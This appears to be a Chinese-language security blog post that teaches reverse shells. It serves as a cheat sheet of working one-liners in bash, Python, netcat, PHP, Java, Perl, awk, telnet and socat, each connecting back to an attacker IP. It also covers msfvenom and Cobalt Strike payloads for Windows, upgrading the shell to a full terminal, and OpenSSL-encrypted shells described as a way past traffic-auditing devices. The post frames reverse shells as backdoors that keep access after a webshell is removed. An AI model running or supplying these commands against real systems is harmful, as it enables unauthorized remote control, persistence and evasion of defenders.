---
title: 反弹shell
tags:
  - web
  - 笔记
categories:
  - 网安技术
abbrlink: 2f610211
date: 2026-01-21 18:19:52
---

## 什么是shell

Shell 俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。简单说用户通过壳（shell）访问操作系统内核的服务，也就是由壳到内核，执行系统命令。

用户->外围程序（shell）->内核->硬件

## 什么是反弹shell

反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。

## 为什么要反弹shell

通常用于被控端因防火墙受限、权限不足、端口被占用等情形。

举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？
有如下情况：

1. 某客户机中了你的网马，但是它在局域网内，你直接连接不了。

2. 目标机器的ip动态改变，你不能持续控制。

3. 由于防火墙等限制，对方机器只能发送请求，不能接收请求。

4. 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，

5. webshell下执行命令不交互，为了方便提权或其它操作必须要反弹shell。

6. 反弹shell相当于新增一个后门，当webshell被发现删除后权限不会丢失。

所以建立一个服务端让恶意程序主动连接，才是上策。

那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。

## 确定目标支持的反弹方式

使用whereis确定目标支持的反弹方式

`whereis nc bash python php exec lua perl ruby`

## bash反弹shell

bash反弹是实战中用的最多的方法

```bash
攻击者：nc -lvp 9999

受害者：bash -i >& /dev/tcp/192.168.20.128/9999 0>&1
```

### 命令解释

`nc -lvp 9999`

```text
nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口
-l 监听模式，用于入站连接
-v 详细输出--用两个-v可得到更详细的内容
-p port 本地端口号
```

`bash -i >& /dev/tcp/192.168.20.128/9999 0>&1`

```text
bash是命令终端，上面反弹shell的命令是在受害者服务器上执行
-i 是指在本地打开bash命令终端
>&后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程vps
/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接
0>&1 表示把受害者主机上的输入重定向的输出流上，而输出流在攻击者主机上，所以攻击者直接控制输入
远程vps开启对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出
```

linux文件描述符：linux shell下有三种标准的文件描述符，分别如下：

| 名称            | 文件描述符 | 说明                 |
| --------------- | ---------- | -------------------- |
| 标准输入 stdin  | `0`        | 你键盘输入的内容     |
| 标准输出 stdout | `1`        | 正常输出到屏幕的内容 |
| 标准错误 stderr | `2`        | 错误输出到屏幕的内容 |

还有就是>&这个符号的含义，最好的理解是这样的：

```text
当>&后面接文件时，表示将标准输出(1)和标准错误输出(2)重定向至文件。
当>&后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符,这个简单说就是前面跟着后面走，也就是说这个命令：bash -i >& /dev/tcp/192.168.20.128/9999 0>&2 也可以的，因为2也是输出到攻击者主机上
```

| 重定向格式 | 含义                                       |
| ---------- | ------------------------------------------ |
| `N>file`   | 把 N 号描述符输出重定向到文件              |
| `N>&M`     | 把 N 号描述符的输出重定向到 M 的目标       |
| `N<&M`     | 把 N 号描述符的**输入**重定向到 M 的输入源 |

## python反弹shell

反弹命令：

```bash
攻击者：nc -lvp 9999

受害者：python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.20.128',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

伪终端：

```bash
python3 -c "import os,socket,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.20.128',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash');"
```

### 命令解释

`import os,socket,subprocess;`

导入必要的标准库：

- `socket`: 用于创建 TCP 连接（本地 ↔ 远程主机）
- `os`: 提供系统级操作，如文件描述符操作（这里关键）
- `subprocess`: 用于启动新的进程（启动 `/bin/bash`）

`s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);`

```text
创建一个 TCP 套接字 s
AF_INET: 表示 IPv4 地址
SOCK_STREAM: 表示使用 TCP 协议
```

什么是 `fileno()`？

```text
每个打开的文件、socket、管道在内核中都有一个文件描述符（file descriptor），是一个整数编号。
s.fileno() 返回 socket 的文件描述符，比如 3（系统分配）,这里就是远程通道的攻击者主机
```

`os.dup2(s.fileno(), X)` 的作用

什么是 `os.dup2(fd_src, fd_dest)`？

```text
这是一个底层系统调用（C 系统调用 dup2() 的 Python 封装）
它的作用是：把 fd_dest（目标）关闭，然后让它指向 fd_src（源）,这里相当于把0，1，2都指向攻击者主机
就像 fd_dest = fd_src，但更底层、更彻底
```

这样，所有的输入输出**都通过 socket 来完成**，也就是都发到了攻击者那边。

## nc反弹shell

使用场景：目标主机安装了netcat

```bash
攻击者：nc -lnvp 9999

受害者：nc -e /bin/bash 192.168.20.128 9999
受害者：nc -e /bin/sh 192.168.20.128 9999
```

### 命令解释

`nc -lnvp 9999`

```text
-n 类似于netstat的-n选项都是不进行DNS解析，nc会对连接主机进行DNS解析，无法解析攻击者主机首行就会警告
```

`nc -e /bin/bash 192.168.20.128 9999`

```text
-e 用于连接远程服务器，常用于反弹shell 后面接的是程序 ip port
```

## php反弹

首先最简单的一个办法，就是使用php的exec函数执行系统命令反弹shell
（需要php关闭safe_mode选项，才可以使用exec函数）

```bash
攻击者：nc -lnvp 9999

受害者：php -r 'exec("/bin/bash -i >& /dev/tcp/192.168.20.128/9999 0>&1");'
```

一些变形：

```bash
攻击者：nc -nvlp 4986

php -r '$sock=fsockopen("192.168.20.128",9999);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### 命令解释

`php -r '$sock=fsockopen("192.168.20.128",9999);exec("/bin/bash -i <&3 >&3 2>&3");'`

```text
<&3 如果前面没有文件描述符，则默认是0<&3,3如果没有定义，则表示事先打开的某个东西，这里表示socket协议
>&3 如果前面没有文件描述符，则默认是1>&3,那这里就表示标准输出也是重定向到3
所以还是将标准输出、标准输入、错误输出都输出到攻击者主机
```

## java反弹

主要是java的class文件进行反弹shell，主要与jndi联动的

```java
import java.io.IOException;

public class fastJsonNC {
    public fastJsonNC() throws IOException {
        Runtime.getRuntime().exec(new String[]{
                "/bin/bash",
                "-c",
                "bash -i >& /dev/tcp/192.168.20.128/9999 0>&1"
        });
    }
}
```

可以看到其实就是bash反弹

## exec反弹

这个和php的exec函数其实是一样的，就是多了一个将FD3绑定到socket协议上了

```bash
攻击者：nc -lnvp 9999

受害者：exec 3<>/dev/tcp/192.168.20.128/9999; /bin/bash -i <&3 >&3 2>&3
```

## perl反弹

```bash
攻击者：nc -lnvp 9999

受害者：perl -e 'use Socket;$i="192.168.20.128";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 命令解释

这里可以看到其实就是把python的换成perl语言来写，原理是一样的

`use Socket;`

- 引入 Perl 的 `Socket` 模块，提供 socket 编程的函数和常量。

 `socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));`

- 创建一个 TCP socket，赋值给文件句柄 `S`
- 参数解释：
	- `S`：这是 Perl 的句柄（socket 名字）
	- `PF_INET`：协议族（IPv4）
	- `SOCK_STREAM`：套接字类型（流式套接字，TCP）
	- `getprotobyname("tcp")`：获取 TCP 协议号（通常是 6）

`open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");`

+ STDIN: 标准输入重定向到socket
+ STDOUT:标准输出重定向到socket
+ STDERR:标准错误输出重定向到socket

## awk反弹

因为awk的{代码}，这里面可以执行代码，这里要先进行端口监听，再进行反弹shell，不然会报错

本质是通过getline进行命令执行

```bash
攻击者：nc -lnvp 9999

受害者：awk 'BEGIN{s="/inet/tcp/0/192.168.20.128/9999";for(;s|&getline c;)while(c|getline)print|&s;close(s)}'
```

### 代码解释

使用 `awk` 的 `BEGIN{ ... }` 块，只在程序开始时执行一次。



 `s="/inet/tcp/0/192.168.20.128/9999"`

这是 gawk（GNU awk）的一种 **特殊语法**：

- gawk 在支持 `two-way open` 的时候，允许把 `/inet/tcp/...` 当成 socket 文件路径。
- `/inet/tcp/0/ip/port` 表示：
	- **协议**：`tcp`
	- **本地端口**：`0`（随机）
	- **目标 IP**：`192.168.20.128`
	- **目标端口**：`9999`

 `s|&getline c`

- `|&` 是 **gawk 的双向管道操作符**，可以同时进行读取和写入。
- `s|&getline c` 的意思是：
	- **从远程读取一行数据**，存入变量 `c`
	- 如果读到内容，继续往下执行

`while(c|getline) print|&s`

- 这部分逻辑是：
	- 把远程发送过来的命令存在变量 `c`（例如 `ls`）
	- 然后执行它（相当于传入 `getline`，类似 `eval`)
	- 把执行结果通过 `print|&s` 发送回远程。

## telnet反弹

需要在攻击主机上分别监听9998和8999端口，执行反弹shell命令后，在9998终端输入命令，8999查看命令执行后的结果

```bash
攻击者：
nc -nvlp 9998		#输入命令
nc -nvlp 8999		#输出命令

受害者：
telnet 192.168.20.128 9998 | /bin/bash | telnet 192.168.20.128 8999
```

本质就是telnet可以直接与服务器交互

## socat反弹

使用场景：需要受害者主机安装socat

```bash
攻击者：nc -lnvp 9999

受害者：socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.20.128:9999
```

socat 是什么？

`socat` 是一个“多功能的 Socket 工具”，名字来自：

> **SO**cket **CAT**, 类似 netcat 但功能更强大。

它可以连接各种**网络流**和**本地文件描述符**、伪终端等。常用于：

- 端口转发
- 构建代理
- reverse shell
- SSL 隧道
- 建立 TTY/PTY 等

### 命令解释

| 参数部分                  | 含义                                                         |
| ------------------------- | ------------------------------------------------------------ |
| `exec:'bash -li'`         | 表示启动一个进程，执行 `bash`，`-l` 是登录 shell，`-i` 是交互式 |
| `pty`                     | 为这个进程分配一个 **伪终端**（pseudo terminal），这是实现交互式 shell 的关键！ |
| `stderr`                  | 把标准错误（stderr）也通过 socket 发送（通常 stderr 不会重定向） |
| `setsid`                  | 创建一个新的会话（session），防止受到原有终端的信号干扰      |
| `sigint`                  | 允许接收 `Ctrl+C`（SIGINT）中断信号                          |
| `sane`                    | 设置终端为“标准模式”（sane mode），清理一些奇怪的终端设置    |
| `tcp:192.168.20.128:9999` | 远程攻击者监听的 IP 和端口，将流量转发过去                   |

# Windows反弹shell

## nc反弹

整体和linux上的差不多，也是需要下载netcat，只是把shell换成了cmd

netcat 下载：https://eternallybored.org/misc/netcat/

```bash
攻击者：nc -lnvp 9999
受害者：nc -e C:\windows\system32\cmd.exe 192.168.20.128 9999
```

## MSF反弹

使用 msfvenom -l 结合关键字过滤（如cmd/windows/reverse），找出我们可能需要的payload

`msfvenom -l payloads | grep 'cmd/windows/reverse'`

生成命令

`msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.20.128 LPORT=9999`

先在msfconsole上进行使用payload

![image-20250522231507975](posts/2f610211/images/image-20250522231507975.webp)

然后将生成的payload在受害者主机的cmd上执行(测试发现只有win10以下的主机才可以，win10及其以上会直接被防火墙拦截)

![image-20250522231811617](posts/2f610211/images/image-20250522231811617.webp)

## CS反弹

首先要开启服务端cs

![image-20250523003512772](posts/2f610211/images/image-20250523003512772.webp)

前面是cs服务器ip，后面是客户端连接密码

![image-20250523003647746](posts/2f610211/images/image-20250523003647746.webp)

![image-20250523003702591](posts/2f610211/images/image-20250523003702591.webp)

然后cs会生成一个payload，接着在受害者主机的cmd上运行就可以了

![image-20250523003911384](posts/2f610211/images/image-20250523003911384.webp)

测试了还是只能在win10及其以下的系统运行，win10及其以上防火墙直接拦截

# 交互式shell

通过nc...命令反弹shell得到的shell并不能称为完全交互的shell，通常称之为’哑’shell。
通常存在以下缺点

1. ctrl-c会中断会话

2. 无法正常使用vim等文本编辑器

3. 没有向上箭头使用历史

4. 无法执行交互式命令

5. 无法查看错误输出

6. 无法使用 tab 命令补全

7. 无法操控jobcontrol

因此有必要去获取一个完全交互的shell(只要获得一个伪终端就可以了)，方法就是在shell 中执行python，使用pty模块，创建一个原生的终端。下面提供两条命令，根据受害者主机python不同，选择不同版本

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
```

即修改成

```bash
python3 -c "import os,socket,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.20.128',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash');"
```

或者用受害者主机直接下载远程vps的木马

# 流量加密

部分防护设备会对内外网传输流量进行审查，反弹shell执行命令都是以明文进行传输的，很容易被查杀。
因此需要将原始流量使用 openssl 加密，绕过流量审计设备。
1、首先kali上生成SSL证书的公钥/私钥对,信息懒得填，一直回车即可。

`openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes`

2、kali使用 OpenSSL 监听一个端口

`openssl s_server -quiet -key key.pem -cert cert.pem -port 8888`


3、目标主机执行反弹加密shell

`mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ip:port > /tmp/s; rm /tmp/s`

### 命令解释

**`mkfifo /tmp/s`**：

- 创建一个名为 `/tmp/s` 的命名管道（FIFO）。

**`/bin/bash -i < /tmp/s 2>&1`**：

- 启动一个交互式 Bash Shell，标准输入从 `/tmp/s` 读取。
- `2>&1` 将标准错误重定向到标准输出，确保所有输出都通过同一通道发送。

**`| openssl s_client -quiet -connect ip:port > /tmp/s`**：

- 将 Bash 的输出通过管道传递给 OpenSSL 的 `s_client`，该客户端尝试连接到指定的 `ip:port`。
- `-quiet` 选项使输出更简洁，适用于数据传输。
- `> /tmp/s` 将从远程主机接收到的数据写入 `/tmp/s`，供 Bash 作为输入读取。

**`rm /tmp/s`**：

- 在连接结束后，删除创建的命名管道 `/tmp/s`，清理痕迹。

